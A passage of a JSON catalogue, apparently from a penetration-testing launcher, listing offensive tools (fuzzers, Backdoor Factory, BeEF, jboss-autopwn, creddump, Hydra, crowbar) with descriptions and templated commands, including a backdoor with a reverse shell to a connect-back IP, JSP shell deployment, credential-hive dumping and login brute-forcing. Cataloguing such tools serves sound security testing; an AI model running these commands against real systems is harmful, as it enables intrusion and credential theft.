    "example": "Use the HTTP plugin (-m HTTP) to fuzz the target (-t 192.168.1.15), stopping after 5 cases (-M 5):\r\ndoona -m HTTP -t 192.168.1.15 -M 5",
    "category": "2",
    "customInput": "Module(FINGER/FTP/HTTP/IMAP/IRC/LPD/PJL/POP/PROXY/RTSP/SMTP/SOCKS4/SOCKS5/TFTP/WHOIS)=${arg1},",
    "cmd": "doona -m ${arg1} -t ${target} -M 15",
    "parser": null
  },
  {
    "name": "DotDotPwn",
    "desc": "It’s a very flexible intelligent fuzzer to discover traversal directory vulnerabilities in software such as HTTP/FTP/TFTP servers, Web platforms such as CMSs, ERPs, Blogs, etc.\r\n\r\nAlso, it has a protocol-independent module to send the desired payload to the host and port specified. On the other hand, it also could be used in a scripting way using the STDOUT module.\r\n\r\nIt’s written in perl programming language and can be run either under *NIX or Windows platforms. It’s the first Mexican tool included in BackTrack Linux (BT4 R2).\r\n\r\nFuzzing modules supported in this version:\r\nHTTP\r\nHTTP URL\r\nFTP\r\nTFTP\r\nPayload (Protocol independent)\r\nSTDOUT",
    "example": "Use the HTTP scan module (-m http) against a host (-h 192.168.1.1) , using the GET method (-M GET):\r\ndotdotpwn.pl -m http -h 192.168.1.1 -M GET\r\n\r\nDon't use this for HTTP, there is another version of this in the Web category.",
    "category": "2",
    "customInput": "Module(http, http-url, ftp, tftp, payload,stdout)=${arg1},",
    "cmd": "dotdotpwn.pl -m ${arg1} -h ${target}",
    "parser": null
  },
  {
    "name": "HexorBase (GUI)",
    "desc": "HexorBase is a database application designed for administering and auditing multiple database servers simultaneously from a centralized location, it is capable of performing SQL queries and bruteforce attacks against common database servers (MySQL, SQLite, Microsoft SQL Server, Oracle, PostgreSQL ). HexorBase allows packet routing through proxies or even metasploit pivoting antics to communicate with remotely inaccessible servers which are hidden within local subnets.",
    "example": "",
    "category": "2",
    "customInput": "",
    "cmd": "hexorbase",
    "parser": null
  },
  {
    "name": "Inguma (INTERACTIVE)",
    "desc": "Inguma is a penetration testing toolkit entirely written in python. The framework includes modules to discover hosts, gather information about, fuzz targets, brute force user names and passwords and, of course, exploits.\r\n\r\nWhile the current exploitation capabilities in Inguma may be limited, this program provides numerous tools for information gathering and target auditing.",
    "example": "",
    "category": "2",
    "customInput": "",
    "cmd": "inguma",
    "parser": null
  },
  {
    "name": "jSQL Injection (GUI)",
    "desc": "jSQL Injection is a lightweight application used to find database information from a distant server. jSQL Injection is free, open source and cross-platform (Windows, Linux, Mac OS X, Solaris).",
    "example": "",
    "category": "2",
    "customInput": "",
    "cmd": "jsql",
    "parser": null
  },
  {
    "name": "Lynis (LOCAL)",
    "desc": "Lynis is an open source security auditing tool. Its main goal is to audit and harden Unix and Linux based systems. It scans the system by performing many security control checks. Examples include searching for installed software and determine possible configuration flaws.\r\n\r\nMany tests are part of common security guidelines and standards, with on top additional security tests. After the scan a report will be displayed with all discovered findings. To provide you with initial guidance, a link is shared to the related Lynis control.",
    "example": "Scan the system in quiet mode (-Q) and output in cronjob format (–cronjob):\r\nlynis -Q --cronjob",
    "category": "2",
    "customInput": "",
    "cmd": "lynis -Q -c --cronjob",
    "parser": null
  },
  {
    "name": "ohrwurm",
    "desc": "ohrwurm is a small and simple RTP fuzzer that has been successfully tested on a small number of SIP phones. \r\n\r\nhttps://en.wikipedia.org/wiki/Real-time_Transport_Protocol\r\n\r\nFeatures:\r\nreads SIP messages to get information of the RTP port numbers\r\nreading SIP can be omitted by providing the RTP port numbers, sothat any RTP traffic can be fuzzed\r\nRTCP traffic can be suppressed to avoid that codecs\r\nlearn about the “noisy line”\r\nspecial care is taken to break RTP handling itself\r\nthe RTP payload is fuzzed with a constant BER\r\nthe BER is configurable\r\nrequires arpspoof from dsniff to do the MITM attack\r\nrequires both phones to be in a switched LAN (GW operation only works partially)",
    "example": "Fuzz two hosts (-a 192.168.1.123 -b 192.168.1.15), both on port 6970 (-A 6970 -B 6970), through interface eth0 (-i eth0):\r\nohrwurm -a 192.168.1.123 -b 192.168.1.15 -A 6970 -B 6970 -i eth0",
    "category": "2",
    "customInput": "Phone 1=${arg1},Phone 2=${arg2},Port for Phone 1(6970)=${arg3},Port for Phone 2(6970)=${arg4},",
    "cmd": "ohrwurm -a ${arg1} -b ${arg2} -A ${arg3} -B ${arg4} -i ${interface}",
    "parser": null
  },
  {
    "name": "Oscanner",
    "desc": "Oscanner is an Oracle assessment framework developed in Java. It has a plugin-based architecture and comes with a couple of plugins that currently do:\r\n\r\nSid Enumeration\r\nPasswords tests (common & dictionary)\r\nEnumerate Oracle version\r\nEnumerate account roles\r\nEnumerate account privileges\r\nEnumerate account hashes\r\nEnumerate audit information\r\nEnumerate password policies\r\nEnumerate database links\r\nThe results are given in a graphical java tree.",
    "example": "Scan the target server (-s 192.168.1.15) on port 1040 (-P 1040):\r\noscanner -s 192.168.1.15 -P 1040",
    "category": "2",
    "customInput": "",
    "cmd": "oscanner -s ${target} -P ${port}",
    "parser": null
  },
  {
    "name": "Powerfuzzer (GUI)",
    "desc": "Powerfuzzer is a highly automated and fully customizable web fuzzer (HTTP protocol based application fuzzer) based on many other Open Source fuzzers available and information gathered from numerous security resources and websites. It was designed to be user friendly, modern, effective and working.\r\n\r\nCurrently, it is capable of identifying these problems:\r\nCross Site Scripting (XSS)\r\nInjections (SQL, LDAP, code, commands, and XPATH)\r\nCRLF\r\nHTTP 500 statuses (usually indicative of a possible misconfiguration/security flaw incl. buffer overflow)\r\nDesigned and coded to be modular and extendable. Adding new checks should simply entail adding new methods.",
    "example": "",
    "category": "2",
    "customInput": "",
    "cmd": "powerfuzzer",
    "parser": null
  },
  {
    "name": "sfuzz-http",
    "desc": "simple fuzz is exactly what it sounds like – a simple fuzzer. don’t mistake simple with a lack of fuzz capability. this fuzzer has two network modes of operation, an output mode for developing command line fuzzing scripts, as well as taking fuzzing strings from literals and building strings from sequences.\r\n\r\nsimple fuzz is built to fill a need – the need for a quickly configurable black box testing utility that doesn’t require intimate knowledge of the inner workings of C or require specialized software rigs. the aim is to just provide a simple interface, clear inputs/outputs, and reusability.\r\n\r\nFeatures:\r\nsimple script language for creating test cases\r\nsupport for repeating strings as well as fixed strings (‘sequences’ vs. ‘literals’)\r\nvariables within test cases (ex: strings to be replaced with different strings)\r\ntcp and udp payload transport (icmp support tbd)\r\nbinary substitution support (see basic.a11 for more information)\r\nplugin support (NEW!) see plugin.txt for more information.\r\nprevious packet contents inclusion",
    "example": "Fuzz the target server (-S 192.168.1.1) on port 10443 (-p 10443) with TCP output mode (-T), using the basic HTTP config (-f /usr/share/sfuzz/sfuzz-sample/basic.http):\r\nsfuzz -S 192.168.1.1 -p 10443 -T -f /usr/share/sfuzz-db/basic.http",
    "category": "2",
    "customInput": "",
    "cmd": "sfuzz -S ${target} -p ${port} -T -f /usr/share/sfuzz-db/basic.http",
    "parser": null
  },
  {
    "name": "sfuzz-all",
    "desc": "simple fuzz is exactly what it sounds like – a simple fuzzer. don’t mistake simple with a lack of fuzz capability. this fuzzer has two network modes of operation, an output mode for developing command line fuzzing scripts, as well as taking fuzzing strings from literals and building strings from sequences.\r\n\r\nsimple fuzz is built to fill a need – the need for a quickly configurable black box testing utility that doesn’t require intimate knowledge of the inner workings of C or require specialized software rigs. the aim is to just provide a simple interface, clear inputs/outputs, and reusability.\r\n\r\nFeatures:\r\nsimple script language for creating test cases\r\nsupport for repeating strings as well as fixed strings (‘sequences’ vs. ‘literals’)\r\nvariables within test cases (ex: strings to be replaced with different strings)\r\ntcp and udp payload transport (icmp support tbd)\r\nbinary substitution support (see basic.a11 for more information)\r\nplugin support (NEW!) see plugin.txt for more information.\r\nprevious packet contents inclusion",
    "example": "sfuzz -S 192.168.1.1 -p 10443 -T -f /usr/share/sfuzz-db/basic.all",
    "category": "2",
    "customInput": "",
    "cmd": "sfuzz -S ${target} -p ${port} -T -f /usr/share/sfuzz-db/basic.all",
    "parser": null
  },
  {
    "name": "sfuzz-smtp",
    "desc": "simple fuzz is exactly what it sounds like – a simple fuzzer. don’t mistake simple with a lack of fuzz capability. this fuzzer has two network modes of operation, an output mode for developing command line fuzzing scripts, as well as taking fuzzing strings from literals and building strings from sequences.\r\n\r\nsimple fuzz is built to fill a need – the need for a quickly configurable black box testing utility that doesn’t require intimate knowledge of the inner workings of C or require specialized software rigs. the aim is to just provide a simple interface, clear inputs/outputs, and reusability.\r\n\r\nFeatures:\r\nsimple script language for creating test cases\r\nsupport for repeating strings as well as fixed strings (‘sequences’ vs. ‘literals’)\r\nvariables within test cases (ex: strings to be replaced with different strings)\r\ntcp and udp payload transport (icmp support tbd)\r\nbinary substitution support (see basic.a11 for more information)\r\nplugin support (NEW!) see plugin.txt for more information.\r\nprevious packet contents inclusion",
    "example": "sfuzz -S 192.168.1.1 -p 10443 -T -f /usr/share/sfuzz/sfuzz-sample/basic.http",
    "category": "2",
    "customInput": "",
    "cmd": "sfuzz -S ${target} -p ${port} -T -f /usr/share/sfuzz-db/basic.smtp",
    "parser": null
  },
  {
    "name": "sfuzz-custom",
    "desc": "simple fuzz is exactly what it sounds like – a simple fuzzer. don’t mistake simple with a lack of fuzz capability. this fuzzer has two network modes of operation, an output mode for developing command line fuzzing scripts, as well as taking fuzzing strings from literals and building strings from sequences.\r\n\r\nsimple fuzz is built to fill a need – the need for a quickly configurable black box testing utility that doesn’t require intimate knowledge of the inner workings of C or require specialized software rigs. the aim is to just provide a simple interface, clear inputs/outputs, and reusability.\r\n\r\nFeatures:\r\nsimple script language for creating test cases\r\nsupport for repeating strings as well as fixed strings (‘sequences’ vs. ‘literals’)\r\nvariables within test cases (ex: strings to be replaced with different strings)\r\ntcp and udp payload transport (icmp support tbd)\r\nbinary substitution support (see basic.a11 for more information)\r\nplugin support (NEW!) see plugin.txt for more information.\r\nprevious packet contents inclusion",
    "example": "sfuzz -S 192.168.1.1 -p 10443 -T -f /usr/share/sfuzz-db/basic.http",
    "category": "2",
    "customInput": "Config file (configs found in /usr/shares/sfuzz-db/)=${arg1},",
    "cmd": "sfuzz -S ${target} -p ${port} -T -f ${arg1}",
    "parser": null
  },
  {
    "name": "SidGuesser",
    "desc": "Guesses sids/instances against an Oracle database according to a predefined dictionary file. The speed is slow (80-100 guesses per second) but it does the job.",
    "example": "Attack the server (-i 192.168.1.205) using a dictionary file (-d /usr/share/wordlists/metasploit/unix_users.txt):\r\nsidguess -i 192.168.1.205 -d /usr/share/wordlists/metasploit/unix_users.txt",
    "category": "2",
    "customInput": "",
    "cmd": "sidguess -i ${target} -d ${pass_file}",
    "parser": null
  },
  {
    "name": "SIPArmyKnife",
    "desc": "SIP Army Knife is a fuzzer that searches for cross site scripting, SQL injection, log injection, format strings, buffer overflows, and more.",
    "example": "siparmyknife -h 127.0.0.1",
    "category": "2",
    "customInput": "",
    "cmd": "siparmyknife -h ${target}",
    "parser": null
  },
  {
    "name": "Nmap-all-http",
    "desc": "This will run all the HTTP scripts for Nmap, dude, this will take awhile.",
    "example": "cmd = 'nmap -script=http-* 192.168.159.139 -oX nmap_http_report.out",
    "category": "2",
    "customInput": "",
    "cmd": "nmap -script=http-* ${target} -oX ${working_dir}/nmap_http_report.out",
    "parser": "nmap"
  },
  {
    "name": "tnscmd10g",
    "desc": "A tool to prod the oracle tnslsnr process on port 1521/tcp.",
    "example": "Retrieve the version (version) from the target server (-h 192.168.1.205):\r\ntnscmd10g version -h 192.168.1.205",
    "category": "2",
    "customInput": "",
    "cmd": "tnscmd10g version -h ${target}",
    "parser": null
  },
  {
    "name": "Yersinia (GUI)",
    "desc": "Yersinia is a framework for performing layer 2 attacks. It is designed to take advantage of some weakeness in different network protocols. It pretends to be a solid framework for analyzing and testing the deployed networks and systems. Attacks for the following network protocols are implemented in this particular release:\r\n\r\nSpanning Tree Protocol (STP)\r\nCisco Discovery Protocol (CDP)\r\nDynamic Trunking Protocol (DTP)\r\nDynamic Host Configuration Protocol (DHCP)\r\nHot Standby Router Protocol (HSRP)\r\n802.1q\r\n802.1x\r\nInter-Switch Link Protocol (ISL)\r\nVLAN Trunking Protocol (VTP)",
    "example": "yersinia [-hVGIDd] [-l logfile] [-c conffile] protocol [protocol_options]",
    "category": "2",
    "customInput": "",
    "cmd": "yersinia -G",
    "parser": null
  },
  {
    "name": "Armitage (GUI)",
    "desc": "Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework.\r\n\r\nThrough one Metasploit instance, your team will:\r\nUse the same sessions\r\nShare hosts, captured data, and downloaded files\r\nCommunicate through a shared event log.\r\nRun bots to automate red team tasks.\r\nArmitage is a force multiplier for red team operations.",
    "example": "",
    "category": "3",
    "customInput": "",
    "cmd": "armitage",
    "parser": null
  },
  {
    "name": "Backdoor Factory",
    "desc": "The goal of BDF is patch executable binaries with user desidered shellcode and continue normal execution of the prepatched state.\r\n\r\nSupporting: Windows PE x32/x64 and Linux ELF x32/x64 (System V)\r\n\r\nSome executables have built in protections, as such this will not work on all binaries. It is advisable that you test target binaries before deploying them to clients or using them in exercises.",
    "example": "Specify the binary to backdoor (-f /usr/share/windows-binaries/plink.exe), set the connect-back IP (-H 192.168.1.202), the connect-back port (-P 4444), and the shell to use (-s reverse_shell_tcp):\r\nbackdoor-factory -f /usr/share/windows-binaries/plink.exe -H 192.168.1.202 -P 4444 -s reverse_shell_tcp",
    "category": "3",
    "customInput": "File to patch=${arg1},IP of host the target connects to=${arg2},Port the target connects to=${arg3},Payload (reverse_shell_tcp)=${arg4},",
    "cmd": "backdoor-factory -f ${arg1} -H ${arg2} -P ${arg3} -s ${arg4}",
    "parser": null
  },
  {
    "name": "BeEF (GUI)",
    "desc": "BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.\r\n\r\nAmid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.",
    "example": "",
    "category": "3",
    "customInput": "",
    "cmd": "beef-xss",
    "parser": null
  },
  {
    "name": "cisco-auditing-tool",
    "desc": "Perl script which scans cisco routers for common vulnerabilities.",
    "example": "Scan the host (-h 192.168.99.230) on port 23 (-p 23), using a password dictionary file (-a /usr/share/wordlists/nmap.lst):\r\nCAT -h 192.168.99.230 -p 23 -a /usr/share/wordlists/nmap.lst",
    "category": "3",
    "customInput": "Wordlist (/usr/share/wordlists/nmap.lst)=${arg1},",
    "cmd": "CAT -h ${target} -p 23 -a ${arg1}",
    "parser": null
  },
  {
    "name": "Commix (NOT DONE)",
    "desc": "Commix (short for [comm]and [i]njection e[x]ploiter) has a simple environment and it can be used, from web developers, penetration testers or even security researchers to test web applications with the view to find bugs, errors or vulnerabilities related to command injection attacks. By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or string. Commix is written in Python programming language.",
    "example": "",
    "category": "3",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "crackle",
    "desc": "crackle exploits a flaw in the BLE pairing process that allows an attacker to guess or very quickly brute force the TK (Temporary Key). With the TK and other data collected from the pairing process, the STK (Short Term Key) and later the LTK (Long Term Key) can be collected.\r\n\r\nWith the STK and LTK, all communications between the master and the slave can be decrypted.",
    "example": "Read the input file (-i ltk_exchange.pcap) and write the decrypted output to disk (-o ltk-decrypted.pcap):\r\ncrackle -i ltk_exchange.pcap -o ltk-decrypted.pcap",
    "category": "3",
    "customInput": "pcap input file=${arg1},pcap output file=${arg2},",
    "cmd": "crackle -i ${arg1} -o ${arg2}",
    "parser": null
  },
  {
    "name": "jboss-autopwn-win",
    "desc": "This JBoss script deploys a JSP shell on the target JBoss AS server. Once deployed, the script uses its upload and command execution capability to provide an interactive session.\r\n\r\nFeatures include:\r\nMultiplatform support – tested on Windows, Linux and Mac targets\r\nSupport for bind and reverse bind shells\r\nMeterpreter shells and VNC support for Windows targets",
    "example": "Attack the target server (192.168.1.200) on the specified port (8080), redirecting stderr (2> /dev/null):\r\njboss-linux 192.168.1.200 8080 2> /dev/null",
    "category": "3",
    "customInput": "",
    "cmd": "jboss-win ${target} ${port} 2> /dev/null",
    "parser": null
  },
  {
    "name": "Linux Exploit Suggester (NOT DONE)",
    "desc": "As the name suggests, this is a Linux Exploit Suggester, with no frills and no fancy features; just a simple script to keep track of vulnerabilities and suggest possible exploits to use to gain ‘root‘ on a legitimate penetration test, or governing examining body.",
    "example": "Search for Linux exploits matching kernel 3.0.0 (-k 3.0.0):\r\n/usr/share/linux-exploit-suggester# ./Linux_Exploit_Suggester.pl -k 3.0.0",
    "category": "3",
    "customInput": "",
    "cmd": "",
    "parser": null
  },
  {
    "name": "RouterSploit (INTERACTIVE)",
    "desc": "The RouterSploit Framework is an open-source exploitation framework dedicated to embedded devices. It consists of various modules that aids penetration testing operations:\r\nexploits – modules that take advantage of identified vulnerabilities\r\ncreds – modules designed to test credentials against network services\r\nscanners – modules that check if a target is vulnerable to any exploit",
    "example": "",
    "category": "3",
    "customInput": "",
    "cmd": "routersploit",
    "parser": null
  },
  {
    "name": "ShellNoob",
    "desc": "Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!\r\n\r\nFeatures:\r\nconvert shellcode between different formats and sources. Formats currently supported: asm, bin, hex, obj, exe, C, python, ruby, pretty, safeasm, completec, shellstorm. (All details in the “Formats description” section.)\r\ninteractive asm-to-opcode conversion (and viceversa) mode. This is useful when you cannot use specific bytes in the shellcode and you want to figure out if a specific assembly instruction will cause problems.\r\nsupport for both ATT & Intel syntax. Check the –intel switch.\r\nsupport for 32 and 64 bits (when playing on x86_64 machine). Check the –64 switch.\r\nresolve syscall numbers, constants, and error numbers (now implemented for real! :-)).\r\nportable and easily deployable (it only relies on gcc/as/objdump and python). It is just one self-contained python script, and it supports both Python2.7+ and Python3+.\r\nin-place development: you run ShellNoob directly on the target architecture!\r\nbuilt-in support for Linux/x86, Linux/x86_64, Linux/ARM, FreeBSD/x86, FreeBSD/x86_64.\r\n“prepend breakpoint” option. Check the -c switch.\r\nread from stdin / write to stdout support (use “-” as filename)\r\nuber cheap debugging: check the –to-strace and –to-gdb option!\r\nUse ShellNoob as a Python module in your scripts! Check the “ShellNoob as a library” section.\r\nVerbose mode shows the low-level steps of the conversion: useful to debug / understand / learn!\r\nExtra plugins: binary patching made easy with the –file-patch, –vm-patch, –fork-nopper options! (all details below)",
    "example": "Start in interactive mode (-i) in asm to opcode mode (–to-opcode):\r\nshellnoob -i --to-opcode",
    "category": "3",
    "customInput": "",
    "cmd": "shellnoob -i --to-opcode",
    "parser": null
  },
  {
    "name": "DNSChef-fakeip",
    "desc": "DNSChef is a highly configurable DNS proxy for Penetration Testers and Malware Analysts. A DNS proxy (aka “Fake DNS”) is a tool used for application network traffic analysis among other uses. For example, a DNS proxy can be used to fake requests for “badguy.com” to point to a local machine for termination or interception instead of a real host somewhere on the Internet.\r\n\r\nThere are several DNS Proxies out there. Most will simply point all DNS queries a single IP address or implement only rudimentary filtering. DNSChef was developed as part of a penetration test where there was a need for a more configurable system. As a result, DNSChef is cross-platform application capable of forging responses based on inclusive and exclusive domain lists, supporting multiple DNS record types, matching domains with wildcards, proxying true responses for nonmatching domains, defining external configuration files, IPv6 and many other features. You can find detailed explanation of each of the features and suggested uses below.\r\n\r\nThe use of DNS Proxy is recommended in situations where it is not possible to force an application to use some other proxy server directly. For example, some mobile applications completely ignore OS HTTP Proxy settings. In these cases, the use of a DNS proxy server such as DNSChef will allow you to trick that application into forwarding connections to the desired destination.",
    "example": "",
    "category": "8",
    "customInput": "",
    "cmd": "dnschef --fakeip=${target}",
    "parser": null
  },
  {
    "name": "DNSChef-fakedomains",
    "desc": "A comma separated list of domain names which will be resolved to a FAKE value specified in the --ip\r\nparameter. All other domain names will be resolved to their true values.",
    "example": "",
    "category": "8",
    "customInput": "A comma separated list of domain names=${arg1},",
    "cmd": "dnschef --fakedomains ${arg1}",
    "parser": null
  },
  {
    "name": "DNSChef-nameservers",
    "desc": "DNSChef is a highly configurable DNS proxy for Penetration Testers and Malware Analysts. A DNS proxy (aka “Fake DNS”) is a tool used for application network traffic analysis among other uses. For example, a DNS proxy can be used to fake requests for “badguy.com” to point to a local machine for termination or interception instead of a real host somewhere on the Internet.\r\n\r\nThere are several DNS Proxies out there. Most will simply point all DNS queries a single IP address or implement only rudimentary filtering. DNSChef was developed as part of a penetration test where there was a need for a more configurable system. As a result, DNSChef is cross-platform application capable of forging responses based on inclusive and exclusive domain lists, supporting multiple DNS record types, matching domains with wildcards, proxying true responses for nonmatching domains, defining external configuration files, IPv6 and many other features. You can find detailed explanation of each of the features and suggested uses below.\r\n\r\nThe use of DNS Proxy is recommended in situations where it is not possible to force an application to use some other proxy server directly. For example, some mobile applications completely ignore OS HTTP Proxy settings. In these cases, the use of a DNS proxy server such as DNSChef will allow you to trick that application into forwarding connections to the desired destination.",
    "example": "",
    "category": "8",
    "customInput": "A comma separated list of alternative DNS servers=${arg1},",
    "cmd": "dnschef --nameservers=${arg1}",
    "parser": null
  },
  {
    "name": "BruteSpray",
    "desc": "BruteSpray takes nmap GNMAP/XML output and automatically brute-forces services with default credentials using Medusa. BruteSpray can even find non-standard ports by using the -sV inside Nmap.",
    "example": "Attack all services in nas.gnmap with a specific user list (unix_users.txt) and password list (password.lst).\r\nbrutespray --file nas.gnmap -U /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/password.lst --threads 3 --hosts 1",
    "category": "9",
    "customInput": "",
    "cmd": "brutespray --file ${working_dir}/intel/nmap_version.xml -U ${user_file} -P ${pass_file} --threads 3 --hosts 1",
    "parser": ""
  },
  {
    "name": "CeWL",
    "desc": "CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.\r\n\r\nCeWL also has an associated command line app, FAB (Files Already Bagged) which uses the same meta data extraction techniques to create author/creator lists from already downloaded.",
    "example": "Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (http://docs.kali.org):\r\ncewl -d 2 -m 5 -w docswords.txt http://docs.kali.org",
    "category": "9",
    "customInput": "URL=${arg1},",
    "cmd": "cewl -d 2 --with-number -e -w ${working_dir}/loot/cewl_wordlist.out ${arg1}",
    "parser": ""
  },
  {
    "name": "chntpw NOT DONE",
    "desc": "Provides a way to view information and change user passwords in a Windows NT/2000 user database file. Old passwords need not be known since they are overwritten. In addition it also contains a simple registry editor (same size data writes) and an hex-editor which enables you to fiddle around with bits and bytes in the file as you wish.\r\n\r\nhttps://en.wikipedia.org/wiki/Chntpw",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "CmosPwd NOT DONE",
    "desc": "",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "cachedump",
    "desc": "creddump is a python tool to extract various credentials and secrets from Windows registry hives. It currently extracts:\r\n\r\n    LM and NT hashes (SYSKEY protected)\r\n    Cached domain passwords\r\n    LSA secrets\r\n\r\nIt essentially performs all the functions that bkhive/samdump2, cachedump, and lsadump2 do, but in a platform-independent way.\r\n\r\nIt is also the first tool that does all of these things in an offline way (actually, Cain & Abel does, but is not open source and is only available on Windows).",
    "example": "/usr/bin/cachedump <system hive> <security hive>",
    "category": "9",
    "customInput": "System hive=${arg1},Security hive=${arg2},",
    "cmd": "/usr/bin/cachedump ${arg1} ${arg2}",
    "parser": ""
  },
  {
    "name": "lsadump",
    "desc": "creddump is a python tool to extract various credentials and secrets from Windows registry hives. It currently extracts:\r\n\r\n    LM and NT hashes (SYSKEY protected)\r\n    Cached domain passwords\r\n    LSA secrets\r\n\r\nIt essentially performs all the functions that bkhive/samdump2, cachedump, and lsadump2 do, but in a platform-independent way.\r\n\r\nIt is also the first tool that does all of these things in an offline way (actually, Cain & Abel does, but is not open source and is only available on Windows).",
    "example": "/usr/bin/lsadump <system hive> <security hive>",
    "category": "9",
    "customInput": "System hive=${arg1},Security hive=${arg2},",
    "cmd": "/usr/bin/lsadump ${arg1} ${arg2}",
    "parser": ""
  },
  {
    "name": "pwdump",
    "desc": "creddump is a python tool to extract various credentials and secrets from Windows registry hives. It currently extracts:\r\n\r\n    LM and NT hashes (SYSKEY protected)\r\n    Cached domain passwords\r\n    LSA secrets\r\n\r\nIt essentially performs all the functions that bkhive/samdump2, cachedump, and lsadump2 do, but in a platform-independent way.\r\n\r\nIt is also the first tool that does all of these things in an offline way (actually, Cain & Abel does, but is not open source and is only available on Windows).",
    "example": "/usr/bin/pwdump <system hive> <SAM hive>",
    "category": "9",
    "customInput": "System hive=${arg1},SAM hive=${arg2},",
    "cmd": "/usr/bin/pwdump ${arg1} ${arg2}",
    "parser": ""
  },
  {
    "name": "crowbar",
    "desc": "Crowbar (formally known as Levye) is a brute forcing tool that can be used during penetration tests. It was developed to brute force some protocols in a different manner according to other popular brute forcing tools. As an example, while most brute forcing tools use username and password for SSH brute force, Crowbar uses SSH key(s). This allows for any private keys that have been obtained during penetration tests, to be used to attack other SSH servers.",
    "example": "Brute force the RDP service on a single host with a specified username and wordlist, using 1 thread:\r\ncrowbar -b rdp -s 192.168.86.61/32 -u victim -C /root/words.txt -n 1",
    "category": "9",
    "customInput": "",
    "cmd": "crowbar -b rdp -s ${target} -u ${user_file} -C ${pass_file} -n 10",
    "parser": ""
  },
  {
    "name": "findmyhash",
    "desc": "findmyhash – Crack hashes with online services.  Accepted algorithms are:\r\n    MD4 – RFC 1320\r\n    MD5 – RFC 1321\r\n    SHA1 – RFC 3174 (FIPS 180-3)\r\n    SHA224 – RFC 3874 (FIPS 180-3)\r\n    SHA256 – FIPS 180-3\r\n    SHA384 – FIPS 180-3\r\n    SHA512 – FIPS 180-3\r\n    RMD160 – RFC 2857\r\n    GOST – RFC 583\r\n    WHIRLPOOL – ISO/IEC 10118-3:2004\r\n    LM – Microsoft Windows hash NTLM – Microsoft Windows hash\r\n    MYSQL – MySQL 3, 4, 5 hash\r\n    CISCO7 – Cisco IOS type 7 encrypted passwords\r\n    JUNIPER – Juniper Networks $9$ encrypted passwords\r\n    LDAP_MD5 – MD5 Base64 encoded\r\n    LDAP_SHA1 – SHA1 Base64 encoded",
    "example": "Specifying the hash algorithm (MD5), attempt to crack the given hash (-h 098f6bcd4621d373cade4e832627b4f6):\r\nfindmyhash MD5 -h 098f6bcd4621d373cade4e832627b4f6",
    "category": "9",
    "customInput": "Hash algorithm=${arg1},Hash=${arg2},",
    "cmd": "findmyhash ${arg1} -h ${arg2}",
    "parser": ""
  },
  {
    "name": "gpp-decrypt",
    "desc": "A simple ruby script that will decrypt a given GPP encrypted string.\r\n\r\nhttps://pentestlab.blog/2017/03/20/group-policy-preferences/",
    "example": "Decrypt the given Group Policy Preferences string (j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw):",
    "category": "9",
    "customInput": "Encrypted string=${arg1},",
    "cmd": "gpp-decrypt ${arg1}",
    "parser": ""
  },
  {
    "name": "hash-identifier (INTERACTIVE)",
    "desc": "Software to identify the different types of hashes used to encrypt data and especially passwords.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "hash-identifier",
    "parser": ""
  },
  {
    "name": "Hashcat (NOT DONE)",
    "desc": "hashcat is the world’s fastest and most advanced password recovery utility, supporting five unique modes of attack for over 200 highly-optimized hashing algorithms. hashcat currently supports CPUs, GPUs, and other hardware accelerators on Linux, Windows, and OSX, and has facilities to help enable distributed password cracking.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "",
    "parser": ""
  },
  {
    "name": "HexorBase (GUI)",
    "desc": "HexorBase is a database application designed for administering and auditing multiple database servers simultaneously from a centralized location, it is capable of performing SQL queries and bruteforce attacks against common database servers (MySQL, SQLite, Microsoft SQL Server, Oracle, PostgreSQL ). HexorBase allows packet routing through proxies or even metasploit pivoting antics to communicate with remotely inaccessible servers which are hidden within local subnets.",
    "example": "",
    "category": "9",
    "customInput": "",
    "cmd": "hexorbase",
    "parser": ""
  },
  {
    "name": "Hydra-single user",
    "desc": "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.\r\n\r\nIt supports: Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.",
    "example": "Attempt to login as the root user (-l root) using a password list (-P /usr/share/wordlists/metasploit/unix_passwords.txt) with 6 threads (-t 6) on the given SSH server (ssh://192.168.1.123):\r\nhydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123",
    "category": "9",
    "customInput": "Username=${arg1},Target server and port e.g ftp://10.0.0.1:21=${arg2},",
    "cmd": "hydra -l ${arg1} -P ${pass_file} ${arg2}",
    "parser": ""
  },
  {
    "name": "Hydra-multi user",
